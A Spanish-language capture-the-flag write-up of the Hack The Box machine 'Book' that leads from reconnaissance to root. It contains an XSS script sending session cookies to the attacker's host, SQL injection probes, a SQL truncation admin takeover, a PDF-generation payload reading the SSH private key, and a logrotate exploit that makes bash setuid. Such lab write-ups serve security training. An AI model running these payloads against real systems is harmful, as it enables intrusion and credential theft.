---
title: Book WriteUp
date: 2023-06-12
categories: [WriteUps, Máquinas Linux]
tags: [SQLi, SQL Truncation Attack]
image:
  path: ../../assets/img/writeups/Book/book.jpg
  width: 528
  height: 340
  alt: Banner Book
---

La máquina tiene dos puertos abiertos, el 22/ssh y 80/http. Realizamos un SQL Truncation Attack y nos metemos como administrador en la web. Hay una vulnerabilidad en la generación de PDFs dinámicos, con ello conseguimos leer archivos locales-LFI-, conseguimos la id_rsa y accedemos al sistema.

Escalada: Lanzamos el pspy y descubrimos que hay un comando que se ejecuta a intervalos regulares de tiempo, es el comando logrotate, y esa versión es vulnerable a escalada de privilegios.


## Reconocimiento

Hoy y posiblemente mañana, si no la acabo hoy, hackearemos la máquina Book de la plataforma Hack The Box-un aplauso a hackthebox-, con ip `10.10.10.176`.

Lo primero es comprobar que tenemos conexión a la máquina:
```
❯ ping -c 1 10.10.10.176
PING 10.10.10.176 (10.10.10.176) 56(84) bytes of data.
64 bytes from 10.10.10.176: icmp_seq=1 ttl=63 time=70.9 ms

--- 10.10.10.176 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 70.919/70.919/70.919/0.000 ms
```
1 paquete envíado, 1 paquete recibido. Hay conectividad.

Realizaremos un escaner de puertos para comprobar cuales están abiertos, para ello usaremos la herramienta nmap:
```
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.176 -oG allPorts

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-12 10:50 CEST
Initiating SYN Stealth Scan at 10:50
Scanning 10.10.10.176 [65535 ports]
Discovered open port 80/tcp on 10.10.10.176
Discovered open port 22/tcp on 10.10.10.176
Completed SYN Stealth Scan at 10:50, 12.86s elapsed (65535 total ports)
Nmap scan report for 10.10.10.176
Host is up, received user-set (0.052s latency).
Scanned at 2023-06-12 10:50:14 CEST for 13s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.07 seconds
           Raw packets sent: 65666 (2.889MB) | Rcvd: 65535 (2.621MB)
```
Esto significan las opciones:

* -p- : Escanea todos los puertos. Hay un total de 65535 puertos
* --open : Muestra únicamente los puertos abiertos.
* -sS : Realiza un TCP SYN Scan
* --min-rate 5000 : Para enviar paquetes no más lentos que 5000 paquetes por segundo
* -vvv : Muestra la información en pantalla mientras se realiza el escaneo
* -n : Para no aplicar resolución DNS
* -Pn : Para que no aplique el protocolo ARP
* 10.10.10.176 : Dirección IP objetivo, la cual quiero escanear
* -oG allPorts : Exportará el output a un fichero grepeable que llamaremos "allPorts"

Nos ha descubierto los puertos 22/ssh y 80/http. Realizamos otro escaneo con otra serie de scripts de reconocimiento para esos puertos:
```
❯ nmap -p22,80 -sC -sV 10.10.10.176 -oN targeted

Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-12 10:55 CEST
Nmap scan report for 10.10.10.176
Host is up (0.054s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f7:fc:57:99:f6:82:e0:03:d6:03:bc:09:43:01:55:b7 (RSA)
|   256 a3:e5:d1:74:c4:8a:e8:c8:52:c7:17:83:4a:54:31:bd (ECDSA)
|_  256 e3:62:68:72:e2:c0:ae:46:67:3d:cb:46:bf:69:b9:6a (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: LIBRARY - Read | Learn | Have Fun
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Pues muy bien. Tenemos versiones de los servicios. La OpenSSH 7.6p1 podría ser vulnerable a User Enumeration (< 7.7).  Pero de momento vamos a ojear la web.

## Buscando vulnerabilidades

No tenemos credenciales para conectarnos por ssh, y aunque pueda realizar ataque de fuerza bruta y probar suerte, prefiero empezar a buscar vulnerabilidades por la web.

Lanzaré la herramienta whatweb para listar las tecnologías que corren por detrás de la página web.
```
❯ whatweb http://10.10.10.176
http://10.10.10.176 [200 OK] Apache[2.4.29], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.176], PasswordField[password], Script, Title[LIBRARY - Read | Learn | Have Fun]
```
Nos saca más o menos lo mismo que con el anterior escaner. Debe haber un campo de login (por lo de PasswordField) veaomoslo desde navegador.

![Web]({{ 'assets/img/writeups/Book/web.png' | relative_url }}){: .center-image }

No parece haber un CMS en específico, podría ser una página personalizada. Hay opción de registro así que vamos a ello.

Me registro. Estoy dentro del panel de usuario.

![Panel]({{ 'assets/img/writeups/Book/panel.png' | relative_url }}){: .center-image }

Parece que es una biblioteca sobre flores. Podemos subir un pdf, quizás algo más, en la parte de "Collections". También parece que podemos ponernos en contacto con el administrador en la parte de "Contact Us", probaré un XSS en esta parte.  
En el campo Message pongo esto `<script src="http://10.10.14.13/pwn.js"></script>`  
Y en mi consola dispondré del siguiente fichero pwn.js:
```js
var request = new XMLHttpRequest();

request.open('GET', 'http://10.10.14.13/?cookie=' + document.cookie);

request.send();
```
Y me abro un servidor con python3:
```
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
Mando el mensaje y me quedo a la escucha un ratillo. Al cabo de ese rato no me llega nada. Voy a cambiar el mensaje por este; ` eyy mira que cosa más curiosa--> http://10.10.14.13/pwn.js` esto ya pasaría a ser un ataque de phising.  
Tampoco hay suerte.

Voy a subir en el apartado "Collections" un pdf de ejemplo. Al subirlo me salta un mensaje diciendo que evaluarán el archivo antes de subirlo a la página. Así que si lo que subo alguien lo mira, interesante, si pudiera meter algún código malicioso dentro del pdf estaría guay. Pero dudo que haya algún código que se interprete dentro de un pdf, al menos no me suena..Además no encuentra donde se alojan los archivos que estoy subiendo, los descargo mediante IDORs; http://10.10.10.176/download.php?file=1 , pero ni idea donde se alojan en el servidor.

Realizaré un fuzzing con gobuster de subidrectorios y archivos php (ya que veo que hay unos cuantos en la web):
```
❯ gobuster dir -u http://10.10.10.176 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php -t 50 -o fuzzing
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.176
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/06/12 14:50:24 Starting gobuster in directory enumeration mode
===============================================================
/search.php           (Status: 302) [Size: 0] [--> index.php]
/docs                 (Status: 301) [Size: 311] [--> http://10.10.10.176/docs/]
/profile.php          (Status: 302) [Size: 0] [--> index.php]                  
/feedback.php         (Status: 302) [Size: 0] [--> index.php]                  
/books.php            (Status: 302) [Size: 0] [--> index.php]                  
/index.php            (Status: 200) [Size: 6800]                               
/admin                (Status: 301) [Size: 312] [--> http://10.10.10.176/admin/]
/download.php         (Status: 302) [Size: 0] [--> index.php]                   
/images               (Status: 301) [Size: 313] [--> http://10.10.10.176/images/]
/home.php             (Status: 302) [Size: 0] [--> index.php]                    
/contact.php          (Status: 302) [Size: 0] [--> index.php]                    
/db.php               (Status: 200) [Size: 0]                                    
/logout.php           (Status: 302) [Size: 0] [--> index.php]                    
/collections.php      (Status: 302) [Size: 0] [--> index.php]                    
/settings.php         (Status: 302) [Size: 0] [--> index.php]                    
Progress: 44866 / 441122 (10.17%)        
```
Lo paro en el 10% porque ya he encontrado alguna cosilla. Por ejemplo db.php y el directorio admin. El db.php no lo puedo leer porque me interpreta el php. En la ruta admin encuentra el panel de acceso para el usuario admin, parecido al de usuario, piden correo y contraseña. El correo del admin lo tenemos porque en "Contact us" salía; **admin@book.htb**.  
Bien, en este punto podríamos intentar un ataque de fuerza bruta pero tardaría lo suyo (mira lo que tarda la respuesta) y aun así puede que la password no este en el diccionario que vayamos a usar. Puedo probar algunas **inyecciones**, en el primer panel no probé. Así que vamos alla, como piden el  @ en el campo email pasaremos la petición al burpsuite para quitarnos esa restricción. La paso al "Repeater" e iré probando en ambos campos estas inyecciones( por agilizar las pongo el Intruder tipo Sniper, indicando los dos campos; email y passwords):
```
' or 1=1-- -
' and 1=1-- -
') or 1=1-- -
') and 1=1-- -
) or 1=1-- -
' order by 100-- -
' oder by 1-- -
' union select 1-- -
' union select 1,2-- -
'union select 1,2,3-- -
' union select 1,2,3,4-- -
' union select 1,2,3,4,5-- -
' union select 1,2,3,4,5,6-- -
' union select 1,2,3,4,5,6,7-- -
' limit 1,1 into 1-- -
' limit 1,2 into 1-- -
'  or sleep(5)-- -
' and sleep(5)-- -
' or '1'='1
' or '1'=1
' and '1'='1
' and '1'=1
' and '1'='2
```
Todas las respuestas devuelven misma longitud de caraceres que corresponden a la dura respuesta "Nope". NOSQLi también podríamos probar pero no es vulnerable.

## Explotación

Hay un tipo de ataque que no hemos probado, pocas veces lo he visto pero he de decir que no es tanta mi experencia. Me refiero al **SQL Truncation Attack**. Se podría caer en él, o al menos htb me dió la pista, porque se acortaba en el perfil un nombre de usuario más largo del máximo permitido. ¿En qué consiste?.

Lo que pretendo con este ataque es registrarme con la misma cuenta del admin; **admin@book.htb**. Cuando hago la petición de registro la base de datos realiazará posiblemente dos consultas:  

1- Comprobará si existe ya el correo, con algo así:  
SELECT * from users WHERE email = {input_email};

2- Si no existe lo introducirá a la base de datos.

Normalmente los campos de entrada tienen una máxima longitud de campo, por ejemplo, digamos 20 palabras. Este ataque juega con lo que pasa si nos sobrepasamos ese límite.

Cuando compara el email con uno existente te dirá que ya existe, si le añado un espacio al correo y un punto al final parece que me lo da por válido (responde 302) pero al meter la contraseña da fallo. Seguiré añadiendo espacios(con algo al final, un punto por ejemplo) hasta que llegue a la longitud máxima de campo (lo sabré si al final funciona, si no funciona pues no lo sabré..). Si funciona, es que hemos llegado al máximo, el correo es más largo que lo permitido así que no puede existir, así que realiza el insert, como hemos puesto espacios(el punto quedaría fuera del máximo) en el comparer los quita. Se duplicaría la cuenta y podríamos acceder con nuestra contraseña.

Lo haremos mediante el burpsuite. Cuando llegamos al sexto espacio tenemos premio.

![Truncation]({{ 'assets/img/writeups/Book/trunc.png' | relative_url }}){: .center-image }

Desde el panel del admin probamos correo y la contraseña puesta y entramos!.

![Admin]({{ 'assets/img/writeups/Book/admin.png' | relative_url }}){: .center-image }

Como administrador tenemos más opciones. La parte más interesante es la de "Collections". Parece que el título y autor que ponga desde el apartado "Collections" pero desde panel de un usuario normal se convierte en PDF en el panel del admin.

No sé porque puñetera razón me expulsa de la cuenta del admin y no me funciona la contraseña para entrar de nuevo... Yo creo que cada cierto tiempo está programado para eso, lo de que no te deja entrar de nuevo igual son por las cookies. Las eliminé, volví a hacerlo y funcionó.

Buscando por internet **html to pdf exploit** encuentra una página de hacktricks;  
https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf
Explican como poder comprobar si es vulnerable. Me copio el primer código de la parte de "Read local file" y la pongo entera en una línea(no hace falta):
```js
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
```
Le quito la palabra btoa -Objeto en JavaScript que encodea las strings a base64, además me salía solo una parte del /etc/passwd-.

Esa línea la añado al "title" en la sección "Collections" como usuario normal, y subo un pdf cualquiera. Una vez subido me dirigo al panel del admin, y voy a Collections-->Collections-->PDF saldrá el **/etc/passwd**.

![etcPasswd]({{ 'assets/img/writeups/Book/etcpasswd.png' | relative_url }}){: .center-image }

Tenemos el usuario **reader** probaré a sacar su id_rsa, cambiaré la línea de antes;
```js
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///home/reader/.ssh/id_rsa");x.send();</script>
```
Pero sale cortada, las líneas no acaban donde deberían, para solucionar el problema añadiremos unas etiqueas "pre" en la parte de respuesta del código:
```js
<script>x=new XMLHttpRequest;x.onload=function(){document.write("<pre>"+this.responseText+"</pre>")};x.open("GET","file:///home/reader/.ssh/id_rsa");x.send();</script>
```

¡¡Conseguimos la id_rsa!!. De esta manera podremos acceder a la máquina objetivo.

```
> chmod 600 id_rsa
> ssh -i id_rsa reader@10.10.10.176

reader@book:~$ id
uid=1000(reader) gid=1000(reader) groups=1000(reader)
reader@book:~$ ls -l
total 8
drwxr-xr-x 2 reader reader 4096 Jul 20  2021 backups
-r-------- 1 reader reader   33 Jun 13 13:52 user.txt
reader@book:~$ cat user.txt
1540fd27b8a2f478a9f2f**********
```

## Escalada de privilegios.

El archivo backups dentro del home de reader promete, al menos por el nombre.
```
reader@book:~$ cd backups/
reader@book:~/backups$ ls -l
total 4
-rw-r--r-- 1 reader reader  0 Jan 29  2020 access.log
-rw-r--r-- 1 reader reader 91 Jan 29  2020 access.log.1
reader@book:~/backups$ cat *
192.168.0.104 - - [29/Jun/2019:14:39:55 +0000] "GET /robbie03 HTTP/1.1" 404 446 "-" "curl"
```
No hay mucho más que ver en esta parte. Pero tiene pinta que habrá un proceso relacionado con esto. Seguiré la estructura que suelo seguir para la escalada y llegaré al punto de esos posibles procesos.

```
reader@book:~/backups$ sudo -l
[sudo] password for reader: 

--> Cancelo porque no tengo contraseña.

reader@book:~/backups$ find / \-perm -4000 2>/dev/null | grep -v snap
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/bin/chfn
/usr/bin/at
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/newgidmap
/usr/bin/newuidmap
/usr/bin/sudo
/usr/bin/traceroute6.iputils
/bin/mount
/bin/umount
/bin/fusermount
/bin/ping
/bin/su

--> Hice grep -v porque snap salía mucho y no creo que hubiera vulns por esa parte

reader@book:~/backups$ getcap -r / 2>/dev/null
/usr/bin/mtr-packet = cap_net_raw+ep

reader@book:~/backups$ uname -a
Linux book 5.4.1-050401-generic #201911290555 SMP Fri Nov 29 11:03:47 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
reader@book:~/backups$ lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 18.04.2 LTS
Release:	18.04
Codename:	bionic

reader@book:~/backups$ cat /etc/crontab

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

--> No parece que haya nada aprovechable

reader@book:~/backups$ systemctl list-timers
NEXT                         LEFT         LAST                         PASSED       UNIT                         ACTIVATES
Tue 2023-06-13 15:03:30 UTC  12s left     Tue 2023-06-13 15:02:30 UTC  47s ago      book.timer                   book.service
Tue 2023-06-13 15:09:00 UTC  5min left    Tue 2023-06-13 14:39:00 UTC  24min ago    phpsessionclean.timer        phpsessionclean.service
Tue 2023-06-13 19:05:59 UTC  4h 2min left Tue 2023-06-13 13:52:37 UTC  1h 10min ago apt-daily.timer              apt-daily.service
Wed 2023-06-14 02:37:35 UTC  11h left     Tue 2023-06-13 14:36:08 UTC  27min ago    

--> Había unos cuantos procesos más. El más útil sería el primero porque se ejecuta cada menos tiempo, el book.service
```
La de atrás suele ser la ruta de búsqueda para escalar privilegios. Exceptuando ese book.service que se ejecuta cada poco no he visto nada interesante. De momento voy a dejar este sevicio apartado. Usaré la herramienta **pspy** para ver procesos que se ejecutan en el sistema a intervalos regulares de tiempo. Esta herramienta la puedes encontrar el github:  
https://github.com/DominicBreuker/pspy/releases  
Te descargas la de pspy64 y la transfieres a la máquina víctima. Desde mi máquina:
```
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.176 - - [13/Jun/2023 17:17:17] "GET /pspy64 HTTP/1.1" 200 -
```
Desde remoto(máquina objetivo):
```
reader@book:/dev/shm$ wget http://10.10.14.17/pspy64
reader@book:/dev/shm$ chmod +x pspy64
reader@book:/dev/shm$ ./pspy64
``` 
Encontramos un proceso interesante, un /usr/sbin/logrotate.

![Logrotate]({{ 'assets/img/writeups/Book/logrotate.png' | relative_url }}){: .center-image }

> ¿Qué es logrotate?  
> Utilidad de sistemas linux que administra la comprensión y rotación de archivos logs.

Busco información por el internet sobre logrotate;`logrotate exploit`, encuentro esta página:  
https://packetstormsecurity.com/files/154743/Logrotate-3.15.1-Privilege-Escalation.html  

Le doy a "Download" y me copio la url:
```
❯ wget https://dl.packetstormsecurity.net/1910-exploits/logrotate3151-escalate.txt

--2023-06-13 17:31:50--  https://dl.packetstormsecurity.net/1910-exploits/logrotate3151-escalate.txt
Resolviendo dl.packetstormsecurity.net (dl.packetstormsecurity.net)... 198.84.60.200
Conectando con dl.packetstormsecurity.net (dl.packetstormsecurity.net)[198.84.60.200]:443... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
```
Ojeo el archivo y parece que se trata de un archivo compilado, en las instrucciones te sale que hay que compilarlo. Lo compilare en la máquina víctima que tiene **gcc**.

Así es como habría que ejecutarlo:  
`./logrotten -p ./payloadfile /tmp/log/pwnme.log`

El archivo **payloadfile** será un archivo en el que pondré el código que quiera, por ejemplo:
```bash
#!/bin/bash

chmod u+s /bin/bash
```
La segunda parte de ese comando, la ruta del log, debe ser lo que tenemos en nuestro /home/backups.

Bien, voy a quitar las primeras lineas el txt(son los comentarios y explicaciones de uso) y paso el archivo a la máquina objetivo.
```
reader@book:/dev/shm$ wget http://10.10.14.13/logrotate3151-escalate.txt
--2023-06-13 15:46:56--  http://10.10.14.13/logrotate3151-escalate.txt
Connecting to 10.10.14.13:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5386 (5.3K) [text/plain]

reader@book:/dev/shm$ ls
logrotate3151-escalate.txt  payloadfile  pspy64
reader@book:/dev/shm$ mv logrotate3151-escalate.txt logrotten.c
reader@book:/dev/shm$ gcc logrotten.c -o logrotten
reader@book:/dev/shm$ ls -l /home/reader/backups/
total 4
-rw-r--r-- 1 reader reader  0 Jan 29  2020 access.log
-rw-r--r-- 1 reader reader 91 Jan 29  2020 access.log.1
reader@book:/dev/shm$ ./logrotten -p ./payloadfile /home/reader/backups/access.log 
Waiting for rotating /home/reader/backups/access.log...
``` 
Está esperando algo..Aquí el punto es meter algo en ese access.log, tendrás que conectarte por ssh con otra consola:
```
❯ ssh -i id_rsa reader@10.10.10.176
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 5.4.1-050401-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Jun 13 16:07:01 UTC 2023


Last login: Tue Jun 13 15:54:25 2023 from 10.10.14.13
reader@book:~$ cd backups/
reader@book:~/backups$ echo "a" > access.log
```
Una vez añadido lo que sea, en la otra consola, donde lanzamos el comando, nos saldrá **Done!**.
```
reader@book:/dev/shm$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1113504 Apr  4  2018 /bin/bash
reader@book:/dev/shm$ bash -p
bash-4.4# id
uid=1000(reader) gid=1000(reader) euid=0(root) groups=1000(reader)
bash-4.4# cat /root/root.txt
ca7749cce3ea35441d016ee*******
```
Y hecho!!!, ha estado guay la máquina. Tuve dos problemas con la matrix, así llamo a cuando no sé que cojones pasa porque parece estar todo bien y no funciona. El primer problema fue con el SQL Truncation porque se salía la cuenta del admin y no me dejaba volver a entrar, y el segundo la con la id_rsa, se mostraba el mensaje de id_rsa invalid format. Algo debía estar mal..Volvi a sacar la id_rsa copiar y pegar unas cuantas veces y al final salió, misterios..

